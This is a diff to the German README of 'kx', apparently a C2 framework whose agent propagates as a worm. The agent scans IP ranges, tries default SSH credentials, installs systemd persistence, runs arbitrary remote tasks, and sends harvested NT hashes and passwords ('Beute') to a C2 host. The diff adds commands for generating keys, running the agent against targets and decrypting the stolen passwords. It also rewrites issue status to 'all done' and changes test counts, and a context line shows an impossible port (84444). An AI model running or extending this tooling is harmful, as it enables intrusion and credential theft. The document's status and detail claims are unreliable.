@@ -30,7 +30,7 @@ in [`kx/README.md`](./kx/README.md) (Workspace) und
 | 2 | [Architektur](#2--architektur) | Crates, Topologie, Datenfluss |
 | 3 | [Voraussetzungen](#3--voraussetzungen) | Toolchain, Rechte, Exploit-Tools |
 | 4 | [Installation](#4--installation) | Bauen, Artefakte, Cargo-Aliase |
-| 5 | [Schnellstart](#5--schnellstart-in-10-minuten) | Server → Zertifikat → Agent → CLI |
+| 5 | [Schnellstart](#5--schnellstart-in-10-minuten) | Server → Zertifikat → Schlüssel → Agent → CLI |
 | 6 | [Betrieb](#6--betrieb) | Server, Agent, CLI, Dashboard im Detail |
 | 7 | [C2-API-Referenz](#7--c2-api-referenz) | Routen, Auth, Beispiele |
 | 8 | [Steuerung im laufenden Betrieb](#8--steuerung-im-laufenden-betrieb) | Tasks, Logs, Abbruch |
@@ -451,7 +451,28 @@ weder in der Browser-Historie noch in den Server-Logs. Die Daten holt sich das
 JavaScript selbst per `fetch` mit `Authorization`-Header; ohne Anmeldung
 bleiben die Tabellen leer.
 
-### Schritt 6 — Agent laufen lassen
+### Schritt 6 — Server-Schlüssel erzeugen
+
+Die Beute verlässt das Zielsystem verschlüsselt. Dafür kapselt der Agent je
+Host einen Master-Key gegen den öffentlichen Server-Schlüssel; den privaten
+Teil hält allein der Operator.
+
+```bash
+# Auf dem C2-Host: Schlüsselpaar erzeugen
+cargo run --release -p kx-core --example gen_server_key -- \
+  hybrid /tmp/kx-server-key.json /tmp/kx-server-pub.json
+```
+
+- `/tmp/kx-server-key.json` — das **geheime** Schlüsselpaar. Bleibt auf dem
+  C2-Host und gehört nach Vaultwarden. Nur die CLI braucht es, um die Beute
+  zu entschlüsseln.
+- `/tmp/kx-server-pub.json` — der **öffentliche** Schlüssel. Den bekommt der
+  Agent über `--server-key`. Damit kann er nichts entschlüsseln.
+
+> **Ohne `--server-key` läuft der Agent normal, aber die Beute landet im
+> Klartext in der Datenbank** — die Versiegelung greift nur mit Schlüssel.
+
+### Schritt 7 — Agent laufen lassen
 
 Auf dem Zielsystem (oder auf einem Testsystem im Scope):
 
@@ -460,6 +481,7 @@ Auf dem Zielsystem (oder auf einem Testsystem im Scope):
   --server https://c2.test.local:8443 \
   --token "$KX_TOKEN" \
   --server-cert /tmp/kx-server.pem \
+  --server-key /tmp/kx-server-pub.json \
   --iface eth0 \
   --start 192.168.10.1 \
   --end   192.168.10.50 \
@@ -484,9 +506,9 @@ Entdeckung:
 > **Achtung:** Der Agent installiert beim Start **Persistenz** (systemd-Unit
 > unter `/etc/systemd/system/kx-agent.service` plus Environment-Datei
 > `/etc/kx/kx-agent.env` mit Modus 0600). Nach dem Test entfernen — siehe
-> [Schritt 8](#schritt-8--aufräumen).
+> [Schritt 9](#schritt-9--aufräumen).
 
-### Schritt 7 — Ergebnisse abfragen
+### Schritt 8 — Ergebnisse abfragen
 
 ```bash
 export KX_C2_URL="https://c2.test.local:8443"
@@ -499,7 +521,15 @@ export KX_C2_TOKEN="$KX_TOKEN"
 ./target/release/kx-cli --cert /tmp/kx-server.pem export /tmp/beute.csv --format csv
 ```
 
-### Schritt 8 — Aufräumen
+Die Beute liegt versiegelt in der Datenbank. Der Export braucht das geheime
+Schlüsselpaar aus Schritt 6, sonst kommt nur der Verschlüsselungszustand:
+
+```bash
+./target/release/kx-cli --cert /tmp/kx-server.pem secrets --decrypt \
+  --server-key /tmp/kx-server-key.json
+```
+
+### Schritt 9 — Aufräumen
 
 ```bash
 # Persistenz entfernen (auf dem Zielsystem)
@@ -595,7 +625,7 @@ Prozess im System lesbar, ein Environment-File mit 0600 ist es nicht.
 6  Tasks ausführen          GET /api/tasks → sh -c → POST /api/tasks/result
 ```
 
-Schritt 6 läuft **nach** der Report-Phase: der Agent holt die offenen Tasks für
+Schritt 7 läuft **nach** der Report-Phase: der Agent holt die offenen Tasks für
 seine eigene `host_id`, führt sie aus (`sh -c` unter Unix, `cmd /C` unter
 Windows) und meldet je Task Status (`done`/`failed`) und Ausgabe zurück. Die
 Ausgabe wird auf **8 KiB** gekürzt, nicht verworfen.
@@ -874,7 +904,7 @@ Persistenz auf allen Zielsystemen entfernen.
 | XSS | jeder API-Wert wird escaped, bevor er in die Tabelle kommt |
 | Token-Leaks | kein Token im Query-String, kein Token im stderr, Environment-Datei 0600 |
 | **Token = Ausführungsrechte** | Der Task-Kanal führt beliebige Kommandos auf dem Zielsystem aus — das Token ist damit ein Vollzugriff, kein Lesezugriff |
-| Beute im Klartext | NT-Hashes und Passwörter in DB und Export — verschlüsselt ablegen, danach löschen |
+| Beute im Klartext | Der Agent versiegelt die Beute mit dem Master-Key des Hosts — aber **nur mit `--server-key`**. Ohne den Schlüssel legt der Server die Passwörter im Klartext ab. Export und DB trotzdem verschlüsselt ablegen, danach löschen |
 | Persistenz | nach dem Test auf **allen** Zielsystemen entfernen |
 
 ### Was kx nicht schützt
@@ -883,7 +913,8 @@ Persistenz auf allen Zielsystemen entfernen.
   Mitschnitten, nicht gegen einen Angreifer mit Zugriff auf den Server.
 - Der Bearer-Token ist der einzige Faktor. Es gibt keine Nutzerkonten, keine
   Rollen, keine Rotation.
-- Die Datenbank ist unverschlüsselt. SQLite liest sie im Klartext.
+- Die Datenbank ist unverschlüsselt. SQLite liest sie im Klartext — mit
+  `--server-key` stehen die Passwörter darin aber nur versiegelt.
 - Der Wurm propagiert sich. Der Kill-Switch ist ein `systemctl stop`, kein
   Netzwerk-Gate.
 
@@ -922,23 +953,18 @@ Der Arbeitsvorrat liegt als Markdown-Issues unter
 [`.scratch/c2-operability/issues/`](./.scratch/c2-operability/issues/), der
 Ablaufplan in [`EPIC.md`](./.scratch/c2-operability/EPIC.md).
 
-**Welle 1 (Betrieb herstellen) ist abgeschlossen:** ISSUE-1 (Serverstart),
-ISSUE-8 (`ml-kem`-Pin), ISSUE-10 (systemd-Unit), ISSUE-12 (API-Authentifizierung),
-ISSUE-13 (Dashboard-Escaping und Token im Query-String).
+**Beide Wellen sind abgeschlossen — alle 14 erfassten Issues sind erledigt**,
+die zugehörigen GitHub-Issues sind geschlossen und die Issue-Dateien stehen auf
+`status: done`. Sie bleiben als Historie im Verzeichnis liegen.
 
-**Welle 2 — Stand der Codeprüfung heute:**
-
-| Issue | Thema | Zustand im Code |
+| Welle | Issues | Ergebnis |
 |---|---|---|
-| ISSUE-2 | Port 445 fehlt in `COMMON_PORTS` | **behoben** — 445 und 3389 stehen in der Liste (Commit `4b6e179`), die Issue-Datei ist nicht nachgezogen |
-| ISSUE-3 | `try_default_credentials` ist ein Stub | **behoben** — echter Versuch über `sshpass`; die Issue-Datei ist nicht nachgezogen |
-| ISSUE-4 | Credential Manager liefert bei *einem* Credential eine leere Liste | offen — betrifft nur Windows |
-| ISSUE-5 | Doc-Fix `--range` im Beispiel-Binary | offen |
-| ISSUE-6 | `tasks`-Tabelle ohne Wirkung | **behoben** — der Agent holt offene Tasks, führt sie aus und meldet das Ergebnis (PR #8) |
-| ISSUE-7 | `wmi_exec` ohne Aufrufer | **behoben** — der WMI-Pfad wurde entfernt statt verdrahtet |
-| ISSUE-9 | Post-Quantum-Verschlüsselung inaktiv | **behoben** — das KEM-Modul ist aktiv, der Agent versiegelt je Host einen Master-Key |
-| ISSUE-11 | Token im Debug-Output | in Arbeit |
-| ISSUE-14 | Agent hängt im SSH-Default-Credential-Test (`sshpass` ohne Timeout) | offen — neu am 2026-11-15 reproduziert |
+| Welle 1 — Betrieb herstellen | ISSUE-1, ISSUE-8, ISSUE-10, ISSUE-12, ISSUE-13 | Der Server startet, `ml-kem` ist gepinnt, die systemd-Unit trägt die Pflichtargumente, die API ist geschützt, das Dashboard escaped |
+| Welle 2 — C2 betriebsfähig | ISSUE-2 bis ISSUE-7, ISSUE-9, ISSUE-11, ISSUE-14 | Das Relay-Skript liegt im Repository, der Credential-Test prüft den Dienst und läuft unter einer Zeitgrenze, der Credential Manager liefert im Ein-Fall eine Liste, der WMI-Pfad ist entfernt, das Hybrid-KEM ist aktiv, das Token maskiert den Debug-Output |
+
+Dasselbe gilt für die Beute: sie geht nur dann verschlüsselt über die Leitung,
+wenn der Agent mit `--server-key` den öffentlichen Server-Schlüssel bekommt
+(siehe [Schritt 6](#schritt-6--server-schlüssel-erzeugen)).
 
 Die Felder `sealed_master` und `master_key` gehören zum Wire-Vertrag. Der Agent
 füllt sie, wenn er mit `--server-key` den öffentlichen Server-Schlüssel bekommt.
@@ -951,7 +977,7 @@ nicht.
 
 ```bash
 cd kx
-cargo test --workspace                     # 74 Tests, 0 Fehler (je Plattform)
+cargo test --workspace                     # 108 Tests, 0 Fehler
 cargo test -p kx-core c2::tests::host_deserializes_from_server_json
 cargo build --release -p kx-server
 ```
@@ -978,7 +1004,7 @@ ausgeführt — nicht nur beschrieben:
 
 | Prüfung | Ergebnis |
 |---|---|
-| `cargo test --workspace` | **63 Tests grün, 0 Fehler** auf dem lokalen Branch-Stand; auf `origin/main` sind es **74 Tests je Plattform** (CI, 2026-11-15) |
+| `cargo test --workspace` | **108 Tests grün, 0 Fehler** (Stand 2026-11-15, `main`) |
 | `kx-server` starten | `Kx-Server lauscht auf https://127.0.0.1:84444 (API: …)` |
 | `GET /api/hosts` ohne Token | `401` |
 | `GET /api/hosts` mit falschem Token | `401` |
